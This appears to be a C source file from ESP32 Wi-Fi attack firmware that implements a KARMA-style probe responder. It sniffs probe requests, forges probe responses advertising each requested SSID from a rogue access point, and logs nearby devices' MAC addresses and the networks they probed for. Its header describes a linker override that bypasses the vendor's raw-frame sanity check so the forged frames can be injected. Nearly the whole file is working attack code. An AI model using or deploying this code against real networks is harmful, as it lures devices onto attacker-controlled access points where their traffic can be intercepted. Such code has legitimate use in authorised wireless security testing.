/**
 * @file karma.c
 * @brief Implements the karma-style probe responder.
 *
 * Sniffs 802.11 probe requests and replies to each with a forged probe
 * response advertising the requested SSID, sourced from our rogue AP's
 * BSSID. See attack_evil_twin.h for the real-world limitation this is
 * subject to (esp_wifi's AP mode only completes associations for its one
 * actively configured SSID).
 *
 * Raw frame injection here reuses attack_deauth's `wsl_bypasser` fix: once
 * that component's ieee80211_raw_frame_sanity_check override is linked into
 * the binary (via -Wl,-zmuldefs), it patches the symbol process-wide, so any
 * esp_wifi_80211_tx call anywhere - including this one - bypasses the stock
 * blob's raw-frame sanity check. No need to redefine it here.
 */
#include "karma.h"

#include <string.h>

#include "freertos/FreeRTOS.h"
#include "freertos/portmacro.h"
#include "esp_log.h"
#include "esp_err.h"
#include "esp_event.h"
#include "esp_wifi.h"
#include "esp_wifi_types.h"
#include "esp_mac.h"

#include "wifi_controller.h"

static const char *TAG = "karma";

#define PROBE_LOG_SIZE 32
#define MAX_PROBE_RESPONSE_FRAME 128

typedef struct __attribute__((__packed__)) {
    uint16_t frame_control;
    uint16_t duration;
    uint8_t addr1[6];
    uint8_t addr2[6];
    uint8_t addr3[6];
    uint16_t seq_ctrl;
} mgmt_frame_header_t;

#define WIFI_FRAME_TYPE_MGMT 0x00
#define WIFI_FRAME_SUBTYPE_PROBE_REQ 0x04

static uint8_t rogue_bssid[6];
static uint8_t rogue_channel;
static bool running = false;

static portMUX_TYPE probe_log_lock = portMUX_INITIALIZER_UNLOCKED;
static karma_probe_t probe_log[PROBE_LOG_SIZE];
static unsigned probe_log_count = 0;
static unsigned probe_log_head = 0;

static void probe_log_add(const uint8_t *sta_mac, const uint8_t *ssid, uint8_t ssid_len) {
    portENTER_CRITICAL(&probe_log_lock);
    karma_probe_t *slot = &probe_log[probe_log_head];
    memcpy(slot->sta_mac, sta_mac, 6);
    if (ssid_len > sizeof(slot->ssid) - 1) {
        ssid_len = sizeof(slot->ssid) - 1;
    }
    memcpy(slot->ssid, ssid, ssid_len);
    slot->ssid[ssid_len] = '\0';
    slot->ssid_len = ssid_len;
    probe_log_head = (probe_log_head + 1) % PROBE_LOG_SIZE;
    if (probe_log_count < PROBE_LOG_SIZE) {
        probe_log_count++;
    }
    portEXIT_CRITICAL(&probe_log_lock);
}

unsigned karma_get_log(karma_probe_t *out, unsigned max_count) {
    portENTER_CRITICAL(&probe_log_lock);
    unsigned n = probe_log_count < max_count ? probe_log_count : max_count;
    for (unsigned i = 0; i < n; i++) {
        // newest first: walk backwards from the slot before head
        unsigned idx = (probe_log_head + PROBE_LOG_SIZE - 1 - i) % PROBE_LOG_SIZE;
        out[i] = probe_log[idx];
    }
    portEXIT_CRITICAL(&probe_log_lock);
    return n;
}

/**
 * @brief Sends a forged probe response advertising `ssid` from rogue_bssid,
 * addressed to `dest_mac`.
 */
static void send_probe_response(const uint8_t *dest_mac, const uint8_t *ssid, uint8_t ssid_len) {
    uint8_t frame[MAX_PROBE_RESPONSE_FRAME];
    unsigned pos = 0;

    mgmt_frame_header_t *hdr = (mgmt_frame_header_t *) frame;
    hdr->frame_control = 0x0050; // type=mgmt(00), subtype=probe response(0101) -> byte0=0x50
    hdr->duration = 0x0000;
    memcpy(hdr->addr1, dest_mac, 6);
    memcpy(hdr->addr2, rogue_bssid, 6);
    memcpy(hdr->addr3, rogue_bssid, 6);
    hdr->seq_ctrl = 0x0000;
    pos += sizeof(mgmt_frame_header_t);

    // Timestamp (8 bytes, left zeroed - not synchronized to a real TSF)
    memset(&frame[pos], 0x00, 8);
    pos += 8;
    // Beacon interval: 100 TU
    frame[pos++] = 0x64;
    frame[pos++] = 0x00;
    // Capability info: ESS, open (no privacy bit)
    frame[pos++] = 0x01;
    frame[pos++] = 0x00;

    // SSID IE
    frame[pos++] = 0x00;
    frame[pos++] = ssid_len;
    memcpy(&frame[pos], ssid, ssid_len);
    pos += ssid_len;

    // Supported Rates IE: 1, 2, 5.5, 11 Mbps (basic rates)
    frame[pos++] = 0x01;
    frame[pos++] = 0x04;
    frame[pos++] = 0x82;
    frame[pos++] = 0x84;
    frame[pos++] = 0x8b;
    frame[pos++] = 0x96;

    // DS Parameter Set IE: current channel
    frame[pos++] = 0x03;
    frame[pos++] = 0x01;
    frame[pos++] = rogue_channel;

    ESP_ERROR_CHECK_WITHOUT_ABORT(esp_wifi_80211_tx(WIFI_IF_AP, frame, pos, false));
}

static void probe_req_handler(void *args, esp_event_base_t event_base, int32_t event_id, void *event_data) {
    wifi_promiscuous_pkt_t *frame = (wifi_promiscuous_pkt_t *) event_data;
    if (frame->rx_ctrl.sig_len < sizeof(mgmt_frame_header_t) + 2) {
        return;
    }

    const mgmt_frame_header_t *hdr = (const mgmt_frame_header_t *) frame->payload;
    uint8_t type = (hdr->frame_control >> 2) & 0x3;
    uint8_t subtype = (hdr->frame_control >> 4) & 0xF;
    if (type != WIFI_FRAME_TYPE_MGMT || subtype != WIFI_FRAME_SUBTYPE_PROBE_REQ) {
        return;
    }

    const uint8_t *body = frame->payload + sizeof(mgmt_frame_header_t);
    unsigned body_len = frame->rx_ctrl.sig_len - sizeof(mgmt_frame_header_t);
    if (body_len < 2 || body[0] != 0x00) {
        // First IE isn't an SSID tag - not a shape we handle
        return;
    }
    uint8_t ssid_len = body[1];
    if (ssid_len == 0 || (unsigned)(2 + ssid_len) > body_len) {
        // Zero length = wildcard probe (any network); skip, nothing to echo back
        return;
    }
    const uint8_t *ssid = &body[2];

    ESP_LOGD(TAG, "Probe request for SSID '%.*s' from " MACSTR, ssid_len, ssid, MAC2STR(hdr->addr2));
    probe_log_add(hdr->addr2, ssid, ssid_len);
    send_probe_response(hdr->addr2, ssid, ssid_len);
}

void karma_start(uint8_t channel, const uint8_t *our_bssid) {
    if (running) {
        return;
    }
    memcpy(rogue_bssid, our_bssid, 6);
    rogue_channel = channel;

    wifictl_sniffer_filter_frame_types(false, true, false);
    wifictl_sniffer_start(channel);
    ESP_ERROR_CHECK(esp_event_handler_register(SNIFFER_EVENTS, SNIFFER_EVENT_CAPTURED_MGMT, &probe_req_handler, NULL));
    running = true;
    ESP_LOGI(TAG, "Karma responder started on channel %u", channel);
}

void karma_stop() {
    if (!running) {
        return;
    }
    ESP_ERROR_CHECK(esp_event_handler_unregister(SNIFFER_EVENTS, SNIFFER_EVENT_CAPTURED_MGMT, &probe_req_handler));
    wifictl_sniffer_stop();
    running = false;
    ESP_LOGI(TAG, "Karma responder stopped");
}
